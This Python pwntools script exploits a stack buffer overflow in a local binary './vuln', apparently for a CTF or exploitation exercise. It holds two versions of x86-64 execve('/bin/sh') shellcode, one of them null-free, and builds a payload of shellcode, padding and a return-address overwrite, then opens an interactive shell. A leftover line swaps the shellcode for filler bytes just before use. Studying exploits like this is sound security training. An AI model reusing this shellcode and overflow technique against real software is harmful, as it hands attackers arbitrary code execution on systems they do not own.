#!/usr/bin/env python
from pwn import *


BIN = "./vuln"
context.binary = BIN
context.log_level = "ERROR"

# Determined through static analysis.
bytes_read = 0x100
offset = 0x80

shellcode_asm = """
    mov rax, 0x68732f6e69622f
    push rax
    mov rdi, rsp

    mov rax, 0
    push rax
    push rdi
    mov rsi, rsp

    mov rdx, 0

    mov rax, 0x3b
    syscall
    """

nullfree_shellcode_asm = """
    // push "//bin/sh\x00" onto the stack and copy it into rdi
    xor ax, ax
    push ax
    /* This code is not compiled with nasm, but with the GNU assembler;
    so the backtick syntax (push `//bin/sh`) doesn't work */
    mov rax, 0x68732f6e69622f2f
    push rax
    mov rdi, rsp

    // Create the ["//bin/sh\x00", NULL] argument array and copy it into rsi
    xor rax, rax
    push rax
    push rdi
    mov rsi, rsp

    // empty environment
    xor rdx, rdx

    // set rax to the execve code
    xor rax, rax
    mov al, 0x3b

    syscall
    """

shellcode = asm(shellcode_asm)
# shellcode = asm(nullfree_shellcode_asm)
shellcode = b"AAAAAAAAAAA"

io = gdb.debug(BIN, gdbscript="""
    break vuln.c:12
    continue
    """)

str_addr = io.recvline().strip(b"\n")
addr = int(str_addr, 16)

# Inject and trigger
payload = b""
payload += shellcode
payload += (offset + 8 - len(shellcode)) * b'A'
payload += pack(addr)
payload += b"\n"

io.send(payload)
io.interactive()
